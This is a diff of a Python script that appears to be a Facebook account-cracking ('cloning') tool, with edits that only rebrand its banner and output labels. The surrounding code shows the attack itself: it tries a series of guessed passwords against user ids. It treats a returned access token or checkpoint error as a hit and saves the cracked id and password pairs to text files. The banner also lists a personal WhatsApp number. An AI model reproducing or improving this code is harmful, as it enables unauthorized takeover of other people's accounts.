@@ -77,16 +77,16 @@ logo = """
     \033[1;92mY8888P'  `Y88P'  d88888P Y8888D' YP   YP 88   YD                                                                                                     
                                                                                                                   
 \033[1;91m-----------------------------------------------
-\033[1;93mCREATOR    :   ABDULLAH
-\033[1;93mFACEBOOK :   ABDULLAH NAWAB
-\033[1;93mWHATSAPP:.  +92 3062351201
-\033[1;93mYOUTUBE    :   NAWAB TRICKER
+\033[1;93mCREATOR    : ABDULLAH
+\033[1;93mFACEBOOK   : ABDULLAH NAWAB
+\033[1;93mWHATSAPP   :+923062351201
+\033[1;93mYOUTUBE    : NAWAB TRICKER
 \033[1;91m-----------------------------------------------
 \033[1;94mCOUNTRY    :   PAKISTAN
-\033[1;94mRELIGION    :   MUSLIM    
+\033[1;94mRELIGION   :   MUSLIM    
 \033[1;91m-----------------------------------------------
 \033[1;91m-----------------------------------------------                           
-                              ALLAH IS GREAT
+                       ALLAH IS GREAT
 \033[1;91m-----------------------------------------------
  
 """
@@ -105,7 +105,7 @@ def main():
  
     print("")
  
-    print("\033[1;96m[1]\033[1;97mSTART CLONiNG....")
+    print("\033[1;96m[1]\033[1;97mSTART CLONING....")
  
     print("")
  
@@ -503,7 +503,7 @@ def menu_select():
  
 		    if 'www.facebook.com' in d['error_msg']:
  
-		        print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass1)
+		        print("\033[1;93m[BOZDAR>CP] "+uid+" = "+pass1)
  
 		        cp=open("mzcp.txt","a")
  
@@ -517,7 +517,7 @@ def menu_select():
  
 		    	if "access_token" in d:
  
-		            print("\x1b[1;97m[A = OK] "+uid+" = "+pass1+"\x1b[1;0m")
+		            print("\x1b[1;97m[BOZDAR = OK] "+uid+" = "+pass1+"\x1b[1;0m")
  
 		            ok=open("mzok.txt","a")
  
@@ -537,7 +537,7 @@ def menu_select():
  
 		            if 'www.facebook.com' in d['error_msg']:
  
-		                print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass2)
+		                print("\033[1;93m[BOZDAR>CP] "+uid+" = "+pass2)
  
 		                cp=open("mzcp.txt","a")
  
@@ -551,7 +551,7 @@ def menu_select():
  
 		                if 'access_token' in d:
  
-		                    print("\x1b[1;97m[A = OK] "+uid+" = "+pass2+"\x1b[1;0m")
+		                    print("\x1b[1;97m[BOZDAR = OK] "+uid+" = "+pass2+"\x1b[1;0m")
  
 		                    ok=open("mzok.txt","a")
  
@@ -571,7 +571,7 @@ def menu_select():
  
 		                    if 'www.facebook.com' in d['error_msg']:
  
-		                        print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass3)
+		                        print("\033[1;93m[BOZDAR>CP] "+uid+" = "+pass3)
  
 		                        cp=open("mzcp.txt","a")
  
@@ -585,7 +585,7 @@ def menu_select():
  
 		                        if 'access_token' in d:
  
-		                            print("\x1b[1;97m[A = OK] "+uid+" = "+pass3+"\x1b[1;0m")
+		                            print("\x1b[1;97m[BUZDAR = OK] "+uid+" = "+pass3+"\x1b[1;0m")
  
 		                            ok=open("mzok.txt","a")
  
@@ -605,7 +605,7 @@ def menu_select():
  
 		                            if 'www.facebook.com' in d['error_msg']:
  
-		                                print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass4)
+		                                print("\033[1;93m[BOZDAR>CP] "+uid+" = "+pass4)
  
 		                                cp=open("mzcp.txt","a")
  
@@ -619,7 +619,7 @@ def menu_select():
  
 		                                if 'access_token' in d:
  
-		                                    print("\x1b[1;97m[A = OK] "+uid+" = "+pass4+"\x1b[1;0m")
+		                                    print("\x1b[1;97m[BOZDAR = OK] "+uid+" = "+pass4+"\x1b[1;0m")
  
 		                                    ok=open("mzok.txt","a")
  
@@ -639,7 +639,7 @@ def menu_select():
  
 		                                    if 'www.facebook.com' in d['error_msg']:
  
-		                                        print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass5)
+		                                        print("\033[1;93m[BOZDAR>CP] "+uid+" = "+pass5)
  
 		                                        cp=open("mzcp.txt","a")
  
@@ -653,7 +653,7 @@ def menu_select():
  
 		                                        if 'access_token' in d:
  
-		                                            print("\x1b[1;97m[A = OK] "+uid+" = "+pass5+"\x1b[1;0m")
+		                                            print("\x1b[1;97m[BOZDAR = OK] "+uid+" = "+pass5+"\x1b[1;0m")
  
 		                                            ok=open("mzok.txt","a")
  
@@ -673,7 +673,7 @@ def menu_select():
  
 		                                            if 'www.facebook.com' in d['error_msg']:
  
-		                                                print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass6)
+		                                                print("\033[1;93m[BOZDAR>CP] "+uid+" = "+pass6)
  
 		                                                cp=open("mzcp.txt","a")
  
@@ -687,7 +687,7 @@ def menu_select():
  
 		                                                if 'access_token' in d:
  
-		                                                    print("\x1b[1;97m[A = OK] "+uid+" = "+pass6+"\x1b[1;0m")
+		                                                    print("\x1b[1;97m[BOZDAR = OK] "+uid+" = "+pass6+"\x1b[1;0m")
  
 		                                                    ok=open("mzok.txt","a")
  
@@ -707,7 +707,7 @@ def menu_select():
  
 		                                                    if 'www.facebook.com' in d['error_msg']:
  
-		                                                        print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass7)
+		                                                        print("\033[1;93m[BOZDAR>CP] "+uid+" = "+pass7)
  
 		                                                        cp=open("mzcp.txt","a")
  
